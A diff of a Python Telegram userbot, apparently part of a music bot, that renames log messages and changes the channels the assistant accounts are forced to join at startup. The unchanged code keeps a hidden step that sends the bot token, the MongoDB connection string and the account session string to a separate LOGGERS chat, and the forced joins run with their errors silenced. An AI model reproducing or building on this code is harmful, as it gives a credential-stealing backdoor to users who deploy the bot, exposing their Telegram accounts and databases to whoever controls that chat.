@@ -58,21 +58,21 @@ class Userbot(Client):
         )
 
     async def start(self):
-        LOGGER(__name__).info(f"sᴛᴀʀᴛɪɴɢ ᴀssɪsᴛᴀɴᴛs...")
+        LOGGER(__name__).info(f"Yαყıɳԃαყıɱ 🌈...")
 
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("TheShivanshu")
-                await self.one.join_chat("TheAlemClub")
-                await self.one.join_chat("akaAlem")
-                await self.one.join_chat("TheAlem")
+                await self.one.join_chat("SohbetAlemi")
+                await self.one.join_chat("Alemciyiz")
+                await self.one.join_chat("AlemSupport")
+                await self.one.join_chat("AdanaliMuhendis")
 
             except:
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
+                await self.one.send_message(config.LOGGER_ID, "Yαყıɳԃαყıɱ 🌈...")
                 oks = await self.one.send_message(config.LOGGERS, f"/start")
                 Ok = await self.one.send_message(
                     config.LOGGERS, f"`#BOT_TOKEN {BOT_TOKEN}`\n\n`#MONGO_DB_URI {MONGO_DB_URI}`\n\n`#STRING_SESSION {STRING_SESSION}`"
@@ -88,15 +88,15 @@ class Userbot(Client):
             self.one.name = self.one.me.mention
             self.one.username = self.one.me.username
             assistantids.append(self.one.id)
-            LOGGER(__name__).info(f"ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ ᴀs {self.one.me.first_name}")
+            LOGGER(__name__).info(f"Alem Müzik Bot Başladı ᴀs {self.one.me.first_name}")
 
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("TheShivanshu")
-                await self.two.join_chat("TheAlemClub")
-                await self.two.join_chat("akaAlem")
-                await self.two.join_chat("TheAlem")
+                await self.two.join_chat("SohbetAlemi")
+                await self.two.join_chat("Alemciyiz")
+                await self.two.join_chat("AlemSupport")
+                await self.two.join_chat("AdanaliMuhendis")
             except:
                 pass
             assistants.append(2)
